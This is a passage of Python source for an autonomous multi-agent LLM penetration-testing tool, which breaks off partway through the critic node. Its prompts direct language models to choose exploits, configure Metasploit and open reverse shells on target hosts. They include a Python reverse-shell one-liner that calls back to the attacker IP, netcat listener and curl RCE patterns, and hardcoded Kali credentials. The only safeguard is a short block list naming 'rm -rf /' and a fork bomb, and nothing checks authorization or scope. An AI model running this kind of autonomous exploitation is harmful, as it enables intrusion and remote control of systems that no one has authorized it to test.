"""
Red Team Multi-Node Agent - Refactored Architecture
Autonomous penetration testing with specialized nodes:
  recon_parser -> researcher -> planner ->
  parameter_solver -> executor -> critic -> (summarizer)
"""

import sys
import json
import re
import time
import operator
from typing import TypedDict, Annotated, List, Literal

import dotenv
import paramiko
from langchain_openai import ChatOpenAI
from langchain_core.messages import (
    BaseMessage, HumanMessage, SystemMessage, ToolMessage, AIMessage
)
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver
from langgraph.types import RetryPolicy

from tools.metasploit_tools import msf_session
from tools.rag import query_knowledge_base, add_to_knowledge_base, query_successful_attacks

# =============================================================================
# CONFIGURATION
# =============================================================================

dotenv.load_dotenv()

MODEL_NAME = "gpt-4o-mini"
KALI_IP = "192.168.34.6"
KALI_USER = "kali"
KALI_PASS = "kali"
MSF_PORT = 55553
MSF_USER = "kali"
MSF_PASS = "kali"

MAX_RETRIES = 10
MAX_EXECUTOR_TOOL_CALLS = 15
MAX_RESEARCHER_TOOL_CALLS = 10
TOKEN_SENSITIVE_THRESHOLD = 100000
HEAVY_MESSAGE_THRESHOLD = 20000

FORBIDDEN_COMMANDS = ["rm -rf /", ":(){ :|:& };:"]

# =============================================================================
# CONSOLE COLORS
# =============================================================================

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_colored(text: str, color: str):
    """Print text with ANSI colors."""
    print(f"{color}{text}{Colors.ENDC}")

# =============================================================================
# SSH UTILITIES
# =============================================================================

def run_ssh_command(command: str) -> str:
    """Execute command on remote Kali machine via SSH."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        stdin, stdout, stderr = ssh.exec_command(command)

        output_lines = []
        for line in iter(stdout.readline, ""):
            output_lines.append(line)

        err_output = stderr.read().decode()
        exit_status = stdout.channel.recv_exit_status()
        full_output = "".join(output_lines).strip()

        if exit_status == 0:
            if not full_output:
                return (
                    f"Command '{command}' executed successfully but returned NO OUTPUT.\n"
                    f"CRITICAL: You must receive output to verify results.\n"
                    f"REACTION REQUIRED: Check log files or use verbose flags."
                )
            return f"Command '{command}' succeeded.\nOutput:\n{full_output}"
        else:
            return f"Command '{command}' failed (Exit Code: {exit_status}).\nError:\n{err_output}"

    except Exception as e:
        return f"SSH Connection/Execution Error: {str(e)}"
    finally:
        ssh.close()

# =============================================================================
# STATE DEFINITION
# =============================================================================

class AgentState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    raw_recon: str             # Raw nmap/recon output from prior agent
    target_info: dict          # {ip, os, hostname, ports: [{port, state, service, version}]}
    current_plan: str          # Attack strategy from planner
    tool_candidate: dict       # {module, description, source} from planner
    execution_result: str      # Output from executor
    loop_step: int
    critic_verdict: str        # "PASS" | "FAIL_PARAM" | "FAIL_EXPLOIT" | "FAIL_CONTEXT"


class ExploitationFindings(TypedDict):
    """Structured output from run_exploitation() for parent killchain consumption."""
    success: bool              # Did we get a session?
    session_id: str            # e.g. "3" or ""
    session_type: str          # "command_shell" | "meterpreter" | ""
    target_ip: str
    target_port: str           # Port that was exploited
    exploit_used: str          # MSF module path or "manual:<desc>"
    access_level: str          # "user" | "root" | "unknown"
    summary: str               # Brief text of what happened

# =============================================================================
# TOOLS
# =============================================================================

@tool
def tool_metasploit_rpc(command: str):
    """
    Executes a command on the ACTIVE Metasploit console.
    State is preserved. You can run 'use exploit/...' in one turn,
    and 'set RHOST ...' in the next.

    **METASPLOIT USAGE**: You have a persistent console session open.
    1. You do NOT need to chain commands with ';'. This is an interactive console,
       enter one command at a time. You can issue 'use exploit/...' then wait for the result.
    2. If a command fails (e.g. 'Unknown command'), check your spelling or context.
    **CRITICAL** 3. When ready to attack YOU MUST ALWAYS FIRST use 'show options'
       to verify that all the fields are set correctly.
    4. If you ran 'show options' and are SURE the options are set, run the exploit
       using 'run -z' (background) or just 'run'.
    5. ALWAYS check the output. If it says 'Exploit completed, but no session',
       it FAILED. Try a different payload or target.
    **CRITICAL** 6. After obtaining a reverse shell session, you should ALWAYS run
       'exit' command to put the session in background.
    """
    try:
        return msf_session.send_command(command)
    except Exception as e:
        return f"RPC Error: {str(e)}"


@tool
def tool_linux_terminal(command: str):
    """
    Executes a shell command on the remote Linux (Kali) terminal via SSH.

    **CRITICAL REQUIREMENT - NON-INTERACTIVE ONLY**:
    You MUST NOT use interactive or blocking commands (dangling commands).
    The terminal environment cannot handle prompts (e.g., password prompts, 'yes/no' confirmations).

    FORBIDDEN:
    - 'ftp [IP]' (Use 'curl' or 'wget' for file transfers instead).
    - 'ssh [User]@[IP]' (Use 'sshpass' if available, or MSF modules).
    - 'top', 'htop', 'nano', 'vi', or any command that starts a continuous UI.
    - Commands that wait for user input indefinitely.

    ALWAYS prefer non-interactive flags (e.g., 'apt-get install -y' instead of 'apt-get install').
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[Terminal Tool] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


# Tool sets for different nodes
RESEARCHER_TOOLS = [query_successful_attacks, query_knowledge_base, add_to_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

RECON_PARSER_PROMPT = f"""You are a recon data parser for a Red Team agent. Your IP is {KALI_IP}.

Your ONLY job: extract structured JSON from the user's nmap/recon output.

Output EXACTLY this JSON format (no extra text, no markdown fences):
{{
  "ip": "<target IP>",
  "os": "<detected OS or 'unknown'>",
  "hostname": "<hostname or 'unknown'>",
  "ports": [
    {{"port": <int>, "state": "open", "service": "<service name>", "version": "<version string>"}},
    ...
  ]
}}

Rules:
- Only include ports with state "open"
- If version is unknown, use empty string ""
- Extract OS from aggressive OS guesses or service info
- If multiple IPs, use the primary target (not your own IP {KALI_IP})
"""

PLANNER_PROMPT = f"""You are a Red Team Strategic Planner. Your attacker IP is {KALI_IP}.

You receive:
1. USER OBJECTIVE — what the operator wants (e.g., "get a reverse shell using python")
2. TARGET INFO — IP, OS, ports/services
3. RESEARCH RESULTS — exploit intelligence from the knowledge base (viable modules, CVEs, compatibility notes)

Your job: interpret user intent, evaluate research results for compatibility, and select ONE attack vector.

**Rules:**
1. **USER INTENT IS THE PRIMARY DECISION DRIVER** — if the user specifies a payload type (e.g., "python reverse shell"), language, technique, or module, the chosen approach MUST actually deliver that. If no MSF module supports the user's preferred payload type for the target service, you MUST switch to approach "manual" instead of forcing an incompatible MSF payload.
2. EVALUATE COMPATIBILITY — check each research result against the target:
   - Does the exploit match the target OS? (no Windows exploits for Linux)
   - Does it match the service VERSION on the target?
   - Is the MSF module path valid?
   - **Does the module support the user's preferred payload type?** Check the researcher's compatibility notes for supported payload types.
3. Pick the most promising compatible exploit
4. Specify the MITRE ATT&CK technique ID
5. If retrying after failure, MUST choose a DIFFERENT approach
6. SCOPE: Exploitation only — no recon/scanning
7. **CHOOSE APPROACH** — select "msf" (Metasploit module) or "manual" (Linux terminal commands):
   - Use "msf" when a compatible MSF module exists that supports the user's needs
   - Use "manual" when the user wants a payload type no MSF module supports, or when MSF has already failed and a manual approach is more promising
   - Manual approach uses tool_linux_terminal for netcat listeners, crafted reverse shells, curl-based RCE, etc.

Output your plan in TWO parts:

PART 1 — Strategy (2-4 sentences):
- Target service and port
- Expected vulnerability / CVE
- How user preferences were incorporated
- Why msf or manual approach was chosen

PART 2 — Selected module as JSON (no markdown fences):
{{"module": "<full MSF module path or null>", "description": "<one-line description>", "source": "<RAG or general_knowledge>", "approach": "msf or manual"}}
"""

RESEARCHER_PROMPT = """You are a Red Team Intelligence Researcher with access to exploitation knowledge bases, guided by the user's objective.

Your job: query the knowledge bases to find viable exploits for the target's services and versions, prioritizing approaches that match the user's stated preferences.

**Available tools:**
- `query_successful_attacks`: Database of PROVEN past successful attacks from previous runs — call this FIRST
- `query_knowledge_base`: Main knowledge base of Metasploit modules, CVEs, and exploitation techniques
- `add_to_knowledge_base`: Store useful findings for future retrieval

**Query strategy — follow this order:**
1. FIRST, call `query_successful_attacks` for the most promising services. Past successes are the highest-value intelligence — a proven exploit saves entire cycles of trial and error. Query one service at a time (e.g., "ProFTPD 1.3.5 remote code execution").
2. THEN, call `query_knowledge_base` for the same services AND any additional services not covered. It is fine and expected to query the same service on both tools — successful_attacks tells you what worked before, the main DB gives you broader options.

**Rules:**
1. **USER INTENT PRIORITY**: If the user specifies a payload type (e.g., "python reverse shell"), technique, or approach, prioritize services and modules that support that payload/technique. Query specifically for compatible modules.
2. Construct VERBOSE queries for each interesting service — include service name, version, OS
   - BAD: "Samba exploit"
   - GOOD: "Remote code execution exploit for Samba 4.3.11 on Ubuntu Linux"
3. Prioritize services with known-vulnerable versions (e.g., ProFTPD 1.3.5, UnrealIRCd, Samba 4.3.x)
4. You have a MAXIMUM of 5 queries total across both tools. Cover DIVERSE services — do not spend all queries on one service. If the target has 5+ interesting ports, spread your queries across them.
5. **GENERAL KNOWLEDGE FALLBACK**: If the knowledge base returns poor results, provide your summary using general knowledge of Metasploit modules and known CVEs.
6. **MANUAL TECHNIQUES**: Note where manual exploitation (netcat, crafted payloads, curl-based RCE) may be viable, especially if MSF modules don't support the user's preferred payload type.
7. When done, respond with a TEXT SUMMARY (no tool calls) listing all viable exploits found:
   - MSF module path for each
   - Compatible payload types (e.g., cmd/unix/reverse_python, cmd/unix/reverse_perl)
   - Required parameters
   - Target service/version/OS compatibility
   - Any version constraints or caveats
   - How findings align with the user's objective"""


PARAMETER_SOLVER_PROMPT = f"""You are a Red Team Parameter Configuration Specialist. Your attacker IP is {KALI_IP}.

You receive:
1. ATTACK PLAN — the planner's strategy including payload preferences and approach (msf or manual)
2. tool_candidate (MSF module path + description + approach)
3. target_info (IP, OS, ports)
4. Any critic feedback from previous attempts

**If approach is "msf" (Metasploit):**

Generate the EXACT sequence of Metasploit commands to configure and run the exploit.

**Mandatory rules:**
1. ALWAYS set: RHOSTS/RHOST <target_ip>, LHOST {KALI_IP}, LPORT 4444
2. Include 'show options' BEFORE 'run' to verify configuration
3. If the module needs specific options (TARGETURI, SITEPATH, etc.), set them based on the target info and your expert knowledge
4. If tool_candidate.module is null, use your general Metasploit knowledge to select and configure an appropriate module
5. If retrying after critic feedback, READ the feedback and adjust the specific parameter that was wrong
6. FOLLOW THE ATTACK PLAN — if the plan specifies a payload type (e.g., "Python reverse shell"), set the matching payload (e.g., 'set payload cmd/unix/reverse_python')
7. **CRITICAL: LHOST and LPORT are PAYLOAD options, not exploit options — you MUST select a payload first before setting them.**

Output the command sequence as a numbered list, one command per line:
1. use <module>
2. show payloads                    ← discover compatible payloads EARLY
3. set payload <compatible_payload> ← BEFORE LHOST/LPORT
4. set RHOSTS <target_ip>
5. set LHOST {KALI_IP}
6. set LPORT 4444
7. [any additional set commands]
8. show options
9. run

**If approach is "manual" (Linux terminal):**

Generate the EXACT sequence of Linux terminal commands for a manual attack (no Metasploit).

Examples of manual attack patterns:
- Netcat listener: `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`
- Python reverse shell trigger via vulnerable service: `echo 'AB; python -c "import socket,subprocess,os;s=socket.socket(...);s.connect((\"{KALI_IP}\",4444));..." | nc <target_ip> <port>`
- Curl-based RCE: `curl http://<target_ip>:<port>/vulnerable_endpoint -d 'payload=...'`
- Crafted payloads via bash, perl, python, ruby

Output the command sequence as a numbered list, one command per line. Each command should use tool_linux_terminal.
"""

EXECUTOR_PROMPT = f"""You are a Red Team Execution Specialist. Your attacker IP is {KALI_IP}.

You have access to the Metasploit console and a Linux terminal. Execute the attack plan step by step.

**Rules:**
1. Issue ONE command at a time via the appropriate tool
2. READ each command's output carefully before issuing the next
3. If you see "session X opened" — that is SUCCESS. Report it immediately.
4. If you see "no session was created", "Exploit failed", or "Connection refused" — that is FAILURE
5. Do NOT blindly run the full sequence — adapt based on output
6. After obtaining a session, run 'exit' to background it
7. When done (success or failure), provide a text assessment of what happened

**Error Recovery:**
8. When you see a [SYSTEM HINT] in tool output, follow its instructions immediately — do NOT skip it
9. If you hit the same error twice (even with different payloads), STOP and provide a text assessment.
   Module/environment errors (e.g., "directory not writable", "Exploit aborted") cannot be fixed by
   switching payloads — report the failure and let the critic route to a different exploit
10. General best practice: after `use <module>`, run `show payloads` EARLY to discover compatible payloads

**Manual Attack Rules:**
13. If the attack plan specifies a MANUAL approach (not MSF), use `tool_linux_terminal` for all commands instead of `tool_metasploit_rpc`.
14. For listener setup in manual mode, use backgrounded commands (e.g., `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`) to avoid blocking the terminal.

**Success indicators:** "Command shell session X opened", "Meterpreter session X opened"
**Failure indicators:** "Exploit completed, but no session", "Connection refused", "Unknown command"
"""

CRITIC_PROMPT = f"""You are a Senior Red Team Lead evaluating attack execution. Your IP is {KALI_IP}.

You receive the execution_result, session detection flag, and recent tool outputs.

**IMPORTANT: The SESSION_DETECTED flag is parsed directly from Metasploit output. If SESSION_DETECTED is True, a session was successfully opened — this is authoritative.**

**Classify the outcome as EXACTLY ONE of:**

1. **PASS** — SESSION_DETECTED is True, OR the error is unfixable (target down, port closed, service not vulnerable after exhausting alternatives).

2. **FAIL_PARAM** — The module is correct but parameters were misconfigured on the LAST attempt (missing LHOST, wrong RHOST, bad TARGETURI). Do NOT use this if the executor tried multiple payloads and got the same module-level error each time — that is FAIL_EXPLOIT.

3. **FAIL_EXPLOIT** — The exploit module itself is wrong for this target. Includes: version mismatch, OS mismatch, AND the same module failing repeatedly with a non-parameter error (e.g., "directory not writable", "Exploit aborted") even after payload swaps.

4. **FAIL_CONTEXT** — The message history is bloated and the agent is clearly confused or looping.

**Output format (ALL fields required):**

CLASSIFICATION: <PASS|FAIL_PARAM|FAIL_EXPLOIT|FAIL_CONTEXT>

WHAT_FAILED: <module path and specific error messages from the execution>

TRIED_SO_FAR: <list of payloads/approaches tried and their outcomes>

ROOT_CAUSE: <your diagnosis of WHY it failed — parameter issue vs module incompatibility vs target configuration>

DO_NOT_REPEAT: <specific modules, payloads, or approaches that were tried and failed — the next attempt MUST avoid these>

NEXT_ACTION: <specific, actionable instruction for the next node — e.g., "Switch to exploit/unix/irc/unreal_ircd_3281_backdoor on port 6697 which supports cmd/unix/reverse_python" or "Set SITEPATH to /var/www/html instead of the default">
"""

SUMMARY_PROMPT = """You are a Senior Red Team Lead. Summarize the penetration testing history below.
Keep technical details: IPs, ports, CVEs, specific failed/successful exploits and module paths.
Note which approaches were tried and why they failed.
Be extremely concise to save tokens."""

COMPRESS_PROMPT = """Summarize this technical output. Keep all IP addresses, port numbers,
vulnerability IDs (CVEs), specific error codes, and MSF module paths. Remove redundant logs or fluff.
Return a technical summary of the 'Results Found'."""

MSF_ERROR_INDICATORS = [
    "Exploit completed, but no session",
    "Exploit aborted",
    "Exploit failed",
    "Unknown datastore option",
    "is not valid",
    "payload has not been selected",
    "OptionValidateError",
    "Handler failed to bind",
]

ERROR_ANALYZER_PROMPT = """You are a Metasploit error analyst. Analyze this tool output and provide a ONE-SENTENCE recovery hint.

Rules:
- If LHOST/LPORT is an "Unknown datastore option" → select a payload first with 'set payload <name>'
- If a payload "is not valid" → run 'show payloads' to see compatible ones
- If the exploit ABORTED (e.g., "directory not writable", config error) → this is a MODULE-level failure, switching payloads will NOT help. Tell the user to STOP and report failure.
- If the exploit completed but no session was created (and did NOT abort) → the payload didn't connect back, suggest a different payload type
- If a handler failed to bind → the port is already in use, suggest changing LPORT
- For any other error, give your best contextual advice based on the output

Output ONLY: [SYSTEM HINT: <your one-sentence advice>]"""

# =============================================================================
# LLM HELPERS
# =============================================================================

def call_llm(
    messages: List[BaseMessage],
    system_prompt: str = None,
    tools: List = None,
    model_name: str = MODEL_NAME,
    temperature: float = 0
) -> BaseMessage:
    """Invoke LLM with optional system prompt and tools."""
    model = ChatOpenAI(model=model_name, temperature=temperature)

    if tools:
        model = model.bind_tools(tools)

    full_messages = []
    if system_prompt:
        full_messages.append(SystemMessage(content=system_prompt))
    full_messages.extend(messages)

    return model.invoke(full_messages)

# =============================================================================
# JSON PARSING HELPER
# =============================================================================

def parse_json_response(text: str) -> dict:
    """Extract JSON from LLM response with fallback for markdown fences."""
    if not text:
        return {}

    # Try direct parse
    try:
        return json.loads(text.strip())
    except (json.JSONDecodeError, ValueError):
        pass

    # Try extracting from ```json ... ``` blocks
    match = re.search(r'```(?:json)?\s*\n?(.*?)\n?\s*```', text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(1).strip())
        except (json.JSONDecodeError, ValueError):
            pass

    # Try finding first { ... } block
    match = re.search(r'\{.*\}', text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(0))
        except (json.JSONDecodeError, ValueError):
            pass

    return {}

# =============================================================================
# MESSAGE COMPRESSION
# =============================================================================

def summarize_history(messages: List[BaseMessage]) -> str:
    """Aggressively condense technical history."""
    history_str = ""
    for m in messages:
        content = m.content[:2000] if m.content else ""
        history_str += f"{type(m).__name__}: {content}\n"

    response = call_llm(
        messages=[HumanMessage(content=history_str)],
        system_prompt=SUMMARY_PROMPT
    )
    return response.content


def compress_large_message(message: BaseMessage) -> BaseMessage:
    """Compress a single large message while preserving technical data."""
    if not message.content or len(message.content) < HEAVY_MESSAGE_THRESHOLD:
        return message

    print_colored(
        f"--- Compressing heavy {type(message).__name__} ({len(message.content)} chars) ---",
        Colors.OKCYAN
    )

    input_content = message.content[:15000]
    response = call_llm(
        messages=[HumanMessage(content=input_content)],
        system_prompt=COMPRESS_PROMPT
    )

    new_content = f"[TECHNICAL SUMMARY OF PREVIOUS OUTPUT]: {response.content}"

    if isinstance(message, ToolMessage):
        return ToolMessage(content=new_content, tool_call_id=message.tool_call_id)
    if isinstance(message, AIMessage):
        return AIMessage(content=new_content, tool_calls=message.tool_calls)
    return HumanMessage(content=new_content)

# =============================================================================
# GRAPH NODES
# =============================================================================

def recon_parser_node(state: AgentState) -> dict:
    """Parse raw_recon data into structured target_info JSON."""
    raw_recon = state.get("raw_recon", "")

    if not raw_recon:
        print_colored("\n[Recon Parser] No recon data provided, skipping.", Colors.WARNING)
        return {"messages": [AIMessage(content="[Recon Parser] No recon data — planner will work from user objective only.")]}

    print_colored("\n[Recon Parser] Extracting target info from recon data...", Colors.HEADER)

    response = call_llm(
        messages=[HumanMessage(content=raw_recon)],
        system_prompt=RECON_PARSER_PROMPT
    )

    target_info = parse_json_response(response.content)

    if not target_info or "ip" not in target_info:
        # Fallback: try to extract IP at minimum
        ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', raw_recon)
        target_ip = ip_match.group(1) if ip_match else "unknown"
        # Skip our own IP
        if target_ip == KALI_IP:
            all_ips = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', raw_recon)
            target_ip = next((ip for ip in all_ips if ip != KALI_IP), "unknown")
        target_info = {"ip": target_ip, "os": "unknown", "hostname": "unknown", "ports": []}

    print_colored(f"[Recon Parser] Target: {target_info.get('ip')} | OS: {target_info.get('os')} | Ports: {len(target_info.get('ports', []))}", Colors.OKGREEN)

    summary_msg = f"[Recon Parser] Identified target {target_info.get('ip')} ({target_info.get('os', 'unknown')}) with {len(target_info.get('ports', []))} open ports."
    return {
        "messages": [AIMessage(content=summary_msg)],
        "target_info": target_info
    }


def planner_node(state: AgentState) -> dict:
    """Select attack vector based on research results, target_info, and user objective."""
    target_info = state.get("target_info", {})
    messages = state['messages']

    print_colored("\n[Planner] Selecting attack vector...", Colors.HEADER)

    # Get the user's original input (skip critic feedback and compressed history)
    user_input = ""
    for msg in messages:
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" not in msg.content and "COMPRESSED HISTORY" not in msg.content:
            user_input = msg.content
            break

    # Gather researcher's findings (text summary + tool messages)
    researcher_summary = ""
    rag_results = []
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content and "[Recon Parser]" not in msg.content:
            if not researcher_summary:
                researcher_summary = msg.content
        if isinstance(msg, ToolMessage):
            rag_results.append(msg.content[:1000])
        if isinstance(msg, AIMessage) and "[Recon Parser]" in (msg.content or ""):
            break

    # Build context for the planner
    context = f"USER OBJECTIVE:\n{user_input}\n\n"
    context += f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
    context += f"RESEARCH RESULTS:\n{researcher_summary}\n\n"
    if rag_results:
        context += f"RAW RAG DATA:\n{'---'.join(rag_results)}\n\n"

    # Include any critic feedback from messages
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            context += f"PREVIOUS FAILURE FEEDBACK:\n{msg.content}\n\n"
            break
        if isinstance(msg, AIMessage) and "CRITIC FEEDBACK" in msg.content:
            context += f"PREVIOUS FAILURE FEEDBACK:\n{msg.content}\n\n"
            break

    response = call_llm(
        messages=[HumanMessage(content=context)],
        system_prompt=PLANNER_PROMPT
    )

    plan = response.content
    print_colored(f"[Planner] Strategy: {plan[:200]}...", Colors.OKGREEN)

    # Extract tool_candidate JSON from planner output (PART 2)
    tool_candidate = parse_json_response(plan)
    if not tool_candidate:
        tool_candidate = {"module": None, "description": "No module selected", "source": "planner", "approach": "msf"}
    if "approach" not in tool_candidate:
        tool_candidate["approach"] = "msf"

    return {
        "messages": [AIMessage(content=f"[Planner] {plan}")],
        "current_plan": plan,
        "tool_candidate": tool_candidate,
        "execution_result": ""      # Clear for fresh cycle
    }


def _is_cycle_boundary(msg) -> bool:
    """Check if a message marks the start of a new researcher cycle."""
    content = msg.content or "" if hasattr(msg, 'content') else ""
    if isinstance(msg, AIMessage) and "[Recon Parser]" in content:
        return True
    if isinstance(msg, AIMessage) and "[Orchestrator]" in content:
        return True
    if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in content:
        return True
    if isinstance(msg, HumanMessage) and "COMPRESSED HISTORY" in content:
        return True
    return False


def researcher_node(state: AgentState) -> dict:
    """Query knowledge base for exploit information based on target services."""
    target_info = state.get("target_info", {})
    messages = state['messages']

    print_colored("\n[Researcher] Querying knowledge base...", Colors.HEADER)

    # Get the user's original objective
    user_input = ""
    for msg in messages:
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" not in msg.content and "COMPRESSED HISTORY" not in msg.content:
            user_input = msg.content
            break

    # Count how many RAG tool calls already made in this researcher cycle
    researcher_tool_count = 0
    for msg in reversed(messages):
        if _is_cycle_boundary(msg):
            break
        if isinstance(msg, ToolMessage):
            researcher_tool_count += 1

    # Build context from target info AND user objective
    context = (
        f"USER OBJECTIVE:\n{user_input}\n\n"
        f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
    )
    context += f"You have made {researcher_tool_count} knowledge base queries so far."

    # Include any critic feedback if retrying
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            context += f"\n\nPREVIOUS FAILURE FEEDBACK:\n{msg.content}"
            break

    # Safety valve: force text summary after max queries
    if researcher_tool_count >= MAX_RESEARCHER_TOOL_CALLS:
        print_colored(
            f"[Researcher] Query cap reached ({researcher_tool_count}). Forcing summary.",
            Colors.WARNING
        )
        # Collect all RAG results seen so far
        rag_snippets = []
        for msg in reversed(messages):
            if isinstance(msg, ToolMessage) and msg.content:
                rag_snippets.append(msg.content[:1000])
            if isinstance(msg, AIMessage) and "[Recon Parser]" in (msg.content or ""):
                break

        rag_summary = "\n---\n".join(rag_snippets) if rag_snippets else "No results found."
        force_msg = HumanMessage(content=(
            f"{context}\n\n"
            f"RAG RESULTS SO FAR:\n{rag_summary}\n\n"
            "You have reached the maximum number of knowledge base queries. "
            "Provide a text summary of what you found. If the RAG results were "
            "not relevant, use your GENERAL KNOWLEDGE of Metasploit modules and "
            "known vulnerabilities for the target services/versions listed above."
        ))
        response = call_llm(
            messages=[force_msg],
            system_prompt=RESEARCHER_PROMPT
        )
        return {"messages": [response]}

    # Normal path: build message window from most recent cycle boundary onwards
    boundary_idx = 0
    for i, msg in enumerate(messages):
        if _is_cycle_boundary(msg):
            boundary_idx = i
    researcher_msgs = list(messages[boundary_idx:])

    # First call: start with context
    if not researcher_msgs or researcher_tool_count == 0:
        researcher_msgs = [HumanMessage(content=context)]
    else:
        # Inject iteration count reminder at the end
        researcher_msgs.append(HumanMessage(content=(
            f"You have made {researcher_tool_count} of {MAX_RESEARCHER_TOOL_CALLS} "
            f"allowed queries. If results are sufficient, provide a text summary now. "
            f"If not relevant, you may query once more OR use general knowledge."
        )))

    response = call_llm(
        messages=researcher_msgs,
        system_prompt=RESEARCHER_PROMPT,
        tools=RESEARCHER_TOOLS
    )
    return {"messages": [response]}


def researcher_tools_node(state: AgentState) -> dict:
    """Execute RAG tool calls from the researcher."""
    tool_node = ToolNode(RESEARCHER_TOOLS)
    result = tool_node.invoke(state)
    return result



def parameter_solver_node(state: AgentState) -> dict:
    """Generate exact MSF command sequence from tool_candidate + target_info + plan."""
    tool_candidate = state.get("tool_candidate", {})
    target_info = state.get("target_info", {})
    current_plan = state.get("current_plan", "")
    messages = state['messages']

    print_colored("\n[Parameter Solver] Configuring exploit parameters...", Colors.HEADER)

    # Include critic feedback if present
    feedback = ""
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            feedback = msg.content
            break

    approach = tool_candidate.get("approach", "msf")

    context = (
        f"ATTACK PLAN:\n{current_plan}\n\n"
        f"TOOL CANDIDATE:\n{json.dumps(tool_candidate, indent=2)}\n\n"
        f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
    )
    if feedback:
        context += f"CRITIC FEEDBACK (fix these issues):\n{feedback}\n\n"

    if approach == "manual":
        context += "Generate the exact Linux terminal command sequence for a manual attack (no MSF)."
    else:
        context += "Generate the exact Metasploit command sequence."

    response = call_llm(
        messages=[HumanMessage(content=context)],
        system_prompt=PARAMETER_SOLVER_PROMPT
    )

    commands = response.content
    print_colored(f"[Parameter Solver] Commands:\n{commands[:300]}...", Colors.OKGREEN)

    return {
        "messages": [AIMessage(content=f"[Parameter Solver] Command sequence:\n{commands}")]
    }


def executor_node(state: AgentState) -> dict:
    """Execute MSF commands one at a time via tool calls. ReAct loop with safety valve."""
    messages = state['messages']

    print_colored("\n[Executor] Running attack sequence...", Colors.HEADER)

    # Count how many tool calls the executor has made in this cycle
    executor_tool_count = 0
    in_executor = False
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Build the executor's message window: parameter_solver output + executor history
    executor_msgs = []
    capturing = False
    for msg in messages:
        if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
            capturing = True
        if capturing:
            executor_msgs.append(msg)

    if not executor_msgs:
        executor_msgs = [messages[-1]]

    # Safety valve: force text response if too many tool calls
    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[Executor] Safety valve: {executor_tool_count} tool calls reached, forcing assessment.", Colors.WARNING)
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content="You have used your maximum tool calls. Provide a text assessment of what happened so far. Did any session open? What errors occurred?")],
            system_prompt=EXECUTOR_PROMPT
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=EXECUTOR_PROMPT,
            tools=EXECUTOR_TOOLS
        )

    return {"messages": [response]}


def executor_tools_node(state: AgentState) -> dict:
    """Execute MSF/SSH tool calls with LLM-based error recovery hints."""
    tool_node = ToolNode(EXECUTOR_TOOLS)
    result = tool_node.invoke(state)

    if "messages" in result:
        for msg in result["messages"]:
            if isinstance(msg, ToolMessage) and msg.content:
                if any(ind in msg.content for ind in MSF_ERROR_INDICATORS):
                    try:
                        hint_response = call_llm(
                            messages=[HumanMessage(content=f"MSF tool output:\n{msg.content[-1500:]}")],
                            system_prompt=ERROR_ANALYZER_PROMPT,
                            temperature=0
                        )
                        if hint_response.content:
                            msg.content += f"\n\n{hint_response.content.strip()}"
                    except Exception:
                        pass
    return result


def extract_verdict(text: str) -> str:
    """Extract structured verdict from critic LLM response."""
    upper = text.upper()
    # Check for explicit CLASSIFICATION: prefix first (prompt's requested format)
    for verdict in ("FAIL_PARAM", "FAIL_EXPLOIT", "FAIL_CONTEXT", "PASS"):
        if f"CLASSIFICATION: {verdict}" in upper:
            return verdict
    # Fallback: bare keyword anywhere in text
    for verdict in ("FAIL_PARAM", "FAIL_EXPLOIT", "FAIL_CONTEXT"):
        if verdict in upper:
            return verdict
    if "PASS" in upper and "FAIL" not in upper:
        return "PASS"
    # Last resort
    return "FAIL_EXPLOIT"


def critic_node(state: AgentState) -> dict:
    """Evaluate execution result with 4-way classification."""
    messages = state['messages']
    execution_result = state.get("execution_result", "")
    current_step = state.get("loop_step", 0)

    print_colored("\n[Critic] Evaluating execution...", Colors.HEADER)

    # Get the executor's final text assessment
    if not execution_result:
        for msg in reversed(messages):
            if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content:
                execution_result = msg.content
                break

    # Check for context bloat
    total_chars = sum(len(m.content) if m.content else 0 for m in messages)

    # Build evidence block
    tool_outputs = []
    for msg in messages[-10:]:
        if isinstance(msg, ToolMessage):
            tool_outputs.append(msg.content[-800:] if len(msg.content) > 800 else msg.content)

